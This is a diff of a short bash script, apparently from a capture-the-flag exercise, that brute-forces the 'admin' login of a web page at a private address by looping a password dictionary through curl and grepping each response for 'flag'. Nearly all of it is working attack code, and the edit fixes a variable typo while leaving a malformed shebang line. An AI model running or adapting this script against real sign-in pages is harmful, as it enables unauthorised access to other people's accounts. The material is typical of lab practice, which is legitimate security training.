@@ -1,34 +1,20 @@
-#!/bin/bash
-# set -euo pipefail
+!/bin/bash
 
-# password=1
-username="admin"
-# dictionary="crackstation-human-only.txt"
-dictionary="crackstation.txt"
-
-# while :
-# do
-# 	echo "trying : $password"
-# 	curl -s "http://192.168.1.23/?page=signin&username=$username&password=$pasword&Login=Login#" | grep -i flag
-
-# 	if [ $? -eq 0 ]
-# 	then
-# 		echo "Found the value of the image : $password"
-# 		exit
-# 	fi
-# 	sleep 0.3
-# 	password=$((i+1))
-# done
+username="admin" # The username we
+host="192.168.1.17" # The ip address of the machine
+dictionary="passwords.txt" # Path to the dictionary (password list)
+i=1 # A simple iterator to know howmany password have we tried
 
 while IFS= read -r password;
 do
-	echo "trying : $password"
-	curl -s "http://192.168.1.23/?page=signin&username=$username&password=$pasword&Login=Login#" | grep -i flag
-
+	echo -n "trying [$i]: $password"
+	curl -s "http://$host/?page=signin&username=$username&password=$password&Login=Login#" | grep flag > /dev/null
 	if [ $? -eq 0 ]
 	then
-		echo "Found the value of the image : $password"
+		printf "\n\n"
+		echo "Found the password : $password"
 		exit
 	fi
-	# sleep 0.3
+	((i=i+1))
+	printf "\33[2K\r"
 done < $dictionary
